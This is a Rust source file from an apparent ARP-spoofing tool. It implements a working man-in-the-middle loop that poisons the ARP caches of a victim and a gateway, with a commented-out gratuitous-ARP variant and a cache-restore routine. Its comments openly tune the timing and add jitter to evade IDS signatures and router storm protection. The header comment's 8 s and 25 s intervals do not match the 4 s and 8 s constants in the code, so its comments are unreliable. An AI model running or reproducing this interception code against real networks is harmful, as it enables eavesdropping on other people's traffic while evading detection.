// src/spoofer/poison.rs
//
// ─────────────────────────────────────────────────────────────────────────────
// Why the old 2-second interval was wrong
// ─────────────────────────────────────────────────────────────────────────────
//
// Sending poison ARP replies every 2 seconds produces:
//   • 1 packet/2s to the victim   (acceptable)
//   • 1 packet/2s to the gateway  (the problem)
//
// Consumer/SOHO routers have ARP storm protection.  When they see the same
// MAC hammering them with unsolicited ARP replies at high frequency they:
//   1. Rate-limit or drop all traffic from that MAC for a cooldown window
//   2. Sometimes write a semi-permanent block that outlasts reboots because
//      it lives in the router's state, not the attacker's
//
// The fix: use separate, much longer intervals for victim vs gateway.
//
//   VICTIM_INTERVAL_MS  = 8_000  (8 s)
//     ARP cache TTL on Windows/Android/iOS is typically 30-60 s.
//     Re-poisoning every 8 s is well within the window while producing
//     7-8x less traffic than the old 2 s loop.
//
//   GATEWAY_INTERVAL_MS = 25_000  (25 s)
//     The gateway only needs its victim-entry refreshed before it expires.
//     25 s is safely below the 30 s floor while reducing gateway-directed
//     ARP traffic by ~12x compared to the old code.
//
// Both intervals have ±20% random jitter added.  Uniform-interval ARP
// streams are a textbook IDS signature; jitter makes the traffic pattern
// look like organic ARP behaviour.
//
// ─────────────────────────────────────────────────────────────────────────────

use crate::network::packet::{ArpPoison, ArpRestore, GratuitousArp};
use pnet::datalink::DataLinkSender;
use pnet::util::MacAddr;
use std::sync::Arc;
use std::time::Duration;
use tokio::sync::Mutex;

// How often to re-poison the VICTIM's ARP cache (victim → gateway entry).
// Must be well under the victim OS ARP TTL (30-60 s on most platforms).
const VICTIM_INTERVAL_MS: u64 = 4_000;

// How often to re-poison the GATEWAY's ARP cache (gateway → victim entry).
// Less frequent because routers have higher ARP TTLs and storm protection.
const GATEWAY_INTERVAL_MS: u64 = 8_000;

// Jitter fraction: actual interval = base ± (base * JITTER_FRACTION).
// 0.20 = ±20%.  Breaks the uniform-interval IDS signature.
const JITTER_FRACTION: f64 = 0.20;

// ─────────────────────────────────────────────────────────────────────────────

pub struct PoisonLoop {
    sender: Arc<Mutex<Box<dyn DataLinkSender>>>,
    our_mac: MacAddr,
}

impl PoisonLoop {
    pub fn new(
        sender: Arc<Mutex<Box<dyn DataLinkSender>>>,
        our_mac: MacAddr,
        // interval_ms kept in signature for API compat but ignored —
        // we use the constants above instead.
        _interval_ms: u64,
    ) -> Self {
        Self { sender, our_mac }
    }

    pub async fn run(
        &self,
        target: super::SpoofTarget,
        mut stop_rx: tokio::sync::oneshot::Receiver<()>,
    ) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {

        // Pre-build both poison packets — they never change.
        // Victim believes: gateway IP → our MAC
        let to_victim = ArpPoison::new(
            target.victim_mac,
            target.victim_ip,
            target.gateway_ip,
            self.our_mac,
        );
        // Gateway believes: victim IP → our MAC
        let to_gateway = ArpPoison::new(
            target.gateway_mac,
            target.gateway_ip,
            target.victim_ip,
            self.our_mac,
        );

        let mut victim_count: u64 = 0;
        let mut gateway_count: u64 = 0;

        // Send the first poison immediately so the MITM position is
        // established before the first interval fires.
        {
            let v = to_victim.to_bytes();
            let g = to_gateway.to_bytes();
            let mut sender = self.sender.lock().await;
            if let Some(Err(e)) = sender.send_to(&v, None) {
                eprintln!("[!] initial poison victim {}: {e}", target.victim_ip);
            }
            if let Some(Err(e)) = sender.send_to(&g, None) {
                eprintln!("[!] initial poison gateway for {}: {e}", target.victim_ip);
            }
        }
        victim_count += 1;
        gateway_count += 1;

        // Track when each side is due for its next refresh.
        let mut next_victim  = tokio::time::Instant::now() + jitter(VICTIM_INTERVAL_MS);
        let mut next_gateway = tokio::time::Instant::now() + jitter(GATEWAY_INTERVAL_MS);

        loop {
            // Sleep until the sooner of the two next deadlines.
            let wake = next_victim.min(next_gateway);

            tokio::select! {
                _ = tokio::time::sleep_until(wake) => {
                    let now = tokio::time::Instant::now();

                    if now >= next_victim {
                        let v = to_victim.to_bytes();
                        let mut sender = self.sender.lock().await;
                        if let Some(Err(e)) = sender.send_to(&v, None) {
                            eprintln!("[!] poison victim {}: {e}", target.victim_ip);
                        }
                        victim_count += 1;
                        next_victim = now + jitter(VICTIM_INTERVAL_MS);

                        if victim_count % 5 == 0 {
                            println!(
                                "[*] poison victim #{} host {} (every ~{}s)",
                                victim_count, target.victim_ip,
                                VICTIM_INTERVAL_MS / 1_000
                            );
                        }
                    }

                    if now >= next_gateway {
                        let g = to_gateway.to_bytes();
                        let mut sender = self.sender.lock().await;
                        if let Some(Err(e)) = sender.send_to(&g, None) {
                            eprintln!("[!] poison gateway for {}: {e}", target.victim_ip);
                        }
                        gateway_count += 1;
                        next_gateway = now + jitter(GATEWAY_INTERVAL_MS);

                        if gateway_count % 3 == 0 {
                            println!(
                                "[*] poison gateway #{} for host {} (every ~{}s)",
                                gateway_count, target.victim_ip,
                                GATEWAY_INTERVAL_MS / 1_000
                            );
                        }
                    }
                }

                _ = &mut stop_rx => {
                    println!("[*] stopping poison for host {}", target.host_id);
                    self.restore(&target).await?;
                    return Ok(());
                }
            }
        }
    }

    // src/spoofer/poison.rs - replace run():

    // pub async fn run(
    //     &self,
    //     target: super::SpoofTarget,
    //     mut stop_rx: tokio::sync::oneshot::Receiver<()>,
    // ) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    //     println!(
    //         "[*] Establishing MITM for {} via gratuitous ARP",
    //         target.victim_ip
    //     );

    //     // ── Phase 1: One-time gratuitous ARP to claim the victim's IP ────────
    //     let garp = GratuitousArp::new(target.victim_ip, self.our_mac);
    //     {
    //         let mut sender = self.sender.lock().await;
    //         // Send 3 times for reliability (ARP can drop)
    //         for _ in 0..3 {
    //             if let Some(Err(e)) = sender.send_to(&garp.to_bytes(), None) {
    //                 eprintln!("[!] gratuitous ARP failed: {e}");
    //             }
    //             drop(sender);
    //             tokio::time::sleep(Duration::from_millis(100)).await;
    //             sender = self.sender.lock().await;
    //         }
    //     }

    //     println!("[+] Gateway now routes {} → our MAC", target.victim_ip);

    //     // ── Phase 2: Periodic victim-only poisoning ──────────────────────────
    //     let to_victim = ArpPoison::new(
    //         target.victim_mac,
    //         target.victim_ip,
    //         target.gateway_ip,
    //         self.our_mac,
    //     );

    //     let mut next_victim = tokio::time::Instant::now() + jitter(VICTIM_INTERVAL_MS);
    //     let mut victim_count = 0u64;

    //     loop {
    //         tokio::select! {
    //             _ = tokio::time::sleep_until(next_victim) => {
    //                 let v = to_victim.to_bytes();
    //                 let mut sender = self.sender.lock().await;
    //                 if let Some(Err(e)) = sender.send_to(&v, None) {
    //                     eprintln!("[!] poison victim {}: {e}", target.victim_ip);
    //                 }
    //                 victim_count += 1;
    //                 next_victim = tokio::time::Instant::now() + jitter(VICTIM_INTERVAL_MS);

    //                 if victim_count % 10 == 0 {
    //                     println!(
    //                         "[*] victim refresh #{} for {} (gateway untouched)",
    //                         victim_count, target.victim_ip
    //                     );
    //                 }
    //             }
    //             _ = &mut stop_rx => {
    //                 println!("[*] stopping MITM for {}", target.victim_ip);
    //                 self.restore(&target).await?;
    //                 return Ok(());
    //             }
    //         }
    //     }
    // }

    async fn restore(
        &self,
        target: &super::SpoofTarget,
    ) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
        println!("[*] restoring ARP caches for {}", target.victim_ip);

        // Victim restoration (unchanged)
        let victim_restore = ArpRestore::new(
            target.victim_mac,
            target.victim_ip,
            target.gateway_ip,
            target.gateway_mac,
        );

        // Gateway restoration: re-announce correct mapping
        let gateway_restore_garp = GratuitousArp::new(
            target.victim_ip,
            target.victim_mac, // ← Real victim MAC now
        );

        let mut sender = self.sender.lock().await;
        for _ in 0..5 {
            if let Some(Err(e)) = sender.send_to(&victim_restore.to_bytes(), None) {
                eprintln!("[!] restore victim: {e}");
            }
            if let Some(Err(e)) = sender.send_to(&gateway_restore_garp.to_bytes(), None) {
                eprintln!("[!] restore gateway: {e}");
            }
            drop(sender);
            tokio::time::sleep(Duration::from_millis(100)).await;
            sender = self.sender.lock().await;
        }

        println!("[+] ARP caches restored for {}", target.victim_ip);
        Ok(())
    }

    // async fn restore(
    //     &self,
    //     target: &super::SpoofTarget,
    // ) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    //     println!("[*] restoring ARP caches for host {}", target.host_id);

    //     // Victim learns: gateway IP → real gateway MAC (the truth)
    //     let victim_restore = ArpRestore::new(
    //         target.victim_mac,
    //         target.victim_ip,
    //         target.gateway_ip,
    //         target.gateway_mac,
    //     );
    //     // Gateway learns: victim IP → real victim MAC (the truth)
    //     let gateway_restore = ArpRestore::new(
    //         target.gateway_mac,
    //         target.gateway_ip,
    //         target.victim_ip,
    //         target.victim_mac,
    //     );

    //     let mut sender = self.sender.lock().await;

    //     // Send 5 restore packets each with a short gap.
    //     // Multiple copies reduce the chance of a packet drop leaving the
    //     // cache in a corrupted state.
    //     for _ in 0..5 {
    //         if let Some(Err(e)) = sender.send_to(&victim_restore.to_bytes(), None) {
    //             eprintln!("[!] restore victim: {e}");
    //         }
    //         if let Some(Err(e)) = sender.send_to(&gateway_restore.to_bytes(), None) {
    //             eprintln!("[!] restore gateway: {e}");
    //         }
    //         // Brief pause between bursts — same reasoning as the poison
    //         // refresh rate: give the ARP stack time to process each update.
    //         drop(sender);
    //         tokio::time::sleep(Duration::from_millis(100)).await;
    //         sender = self.sender.lock().await;
    //     }

    //     println!("[+] ARP caches restored for host {}", target.host_id);
    //     Ok(())
    // }
}

// ─────────────────────────────────────────────────────────────────────────────
// Jitter helper
//
// Returns a Duration of `base_ms ± (base_ms * JITTER_FRACTION)`.
// Uses a simple LCG seeded from the current time — no external crate needed.
// ─────────────────────────────────────────────────────────────────────────────

fn jitter(base_ms: u64) -> Duration {
    // Tiny LCG: good enough for timing jitter, no crypto needed.
    let seed = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .subsec_nanos() as u64;
    let rand = (seed
        .wrapping_mul(6_364_136_223_846_793_005)
        .wrapping_add(1_442_695_040_888_963_407))
        >> 33;

    let window = (base_ms as f64 * JITTER_FRACTION) as u64; // e.g. 1_600 for 8_000
    let offset = rand % (window * 2); // 0 .. 2*window
    // Shift so range is -window .. +window, then clamp to avoid underflow
    let actual = base_ms.saturating_add(offset).saturating_sub(window);
    Duration::from_millis(actual)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_jitter_within_bounds() {
        for _ in 0..1_000 {
            let d = jitter(8_000);
            let ms = d.as_millis() as u64;
            let window = (8_000f64 * JITTER_FRACTION) as u64;
            assert!(ms >= 8_000 - window, "jitter below floor: {ms}");
            assert!(ms <= 8_000 + window, "jitter above ceiling: {ms}");
        }
    }

    #[test]
    fn test_jitter_not_constant() {
        // With 1000 samples the probability of all being identical is ~0.
        let samples: Vec<u64> = (0..20).map(|_| jitter(8_000).as_millis() as u64).collect();
        let unique: std::collections::HashSet<u64> = samples.iter().copied().collect();
        assert!(
            unique.len() > 1,
            "jitter produced identical values — LCG broken"
        );
    }

    #[test]
    fn test_gateway_interval_longer_than_victim() {
        assert!(
            GATEWAY_INTERVAL_MS > VICTIM_INTERVAL_MS,
            "gateway should be poisoned less frequently than victim"
        );
    }

    #[test]
    fn test_intervals_under_arp_ttl() {
        // Both intervals must be well under the minimum ARP TTL (30_000 ms)
        // or the cache expires before we re-poison it.
        assert!(VICTIM_INTERVAL_MS < 30_000);
        assert!(GATEWAY_INTERVAL_MS < 30_000);
    }
}
